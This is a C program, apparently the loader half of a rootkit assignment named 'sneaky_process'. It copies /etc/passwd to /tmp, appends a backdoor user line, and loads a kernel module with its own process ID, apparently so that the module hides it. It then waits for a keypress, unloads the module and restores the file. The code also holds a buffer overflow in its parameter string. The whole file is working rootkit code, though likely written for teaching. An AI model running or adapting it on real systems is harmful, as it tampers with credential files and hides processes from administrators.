#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>


void copyfile(char* old, char* new){
  if(old == NULL||new == NULL){
    printf("invalid file\n");
    return; //fail
  }
  int forkstate;
  pid_t pid = fork();
  if(pid < 0){
    printf("fork failed\n");
    return;
  }
  else if(pid == 0){ //child
    //copy the old file to the new file
    execl("/bin/cp", "/bin/cp", old, new, (char*)0);
    exit(0);
  }
  else{
     waitpid(pid, &forkstate, 0);
     if(forkstate == 0){
       //printf("The child process ended normally.\n");
     }
     else{
       printf("The child process ended with error.\n");
     }
  }
}

void loadmo(char* modname,int flag){
  int forkstate;
  pid_t pid = fork();
  if(pid < 0){
    printf("fork failed\n");
    return;
  }
  else if(pid == 0){ //child
    pid_t parentid = getppid();
    char buffer[]="processid=";
    char p[20];
    sprintf(p,"%d",parentid);
    strcat(buffer,p);
    //printf("after:%s\n",buffer);
    //printf("sneaky_process pid = %d\n",parentid);
    if(flag == 1){
      printf("sneaky_process pid = %d\n",parentid);
      execl("/sbin/insmod", "insmod", modname, buffer,(char*)0);
    }
    else if(flag == 0){
      execl("/sbin/rmmod", "rmmod", modname, (char*)0);
    }
    exit(0);
  }
  else{
    waitpid(pid, &forkstate, 0);
    if(forkstate == 0){
      //printf("The child process ended normally.\n");
    }
    else{
      printf("The child process ended with error.\n");
    }
  }
} 

int main(void){
  char* syspass = "/etc/passwd";
  char* malpass = "/tmp/passwd";

  //part 1
  copyfile(syspass,malpass);
  //copyfile(malpass,syspass);
  char username[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  FILE* add = fopen("/etc/passwd", "a");
  if(add != NULL){
  fprintf(add, "%s\n",username);
  }
  else{
    printf("invalid file\n");
  }
  if(fclose(add) != 0){
    printf("fail to close file\n");
    return EXIT_FAILURE;
  }

  //part 2
  char* modname="sneaky_mod.ko";
  loadmo(modname,1);

  //part 3
  char ch;
  while(read(STDIN_FILENO, &ch, 1) > 0){
    if(ch == 'q'){
      break;
    }
  }

  //part 4
  loadmo("sneaky_mod",0);


  //part 5
  copyfile(malpass,syspass); 
  return 0;
} 
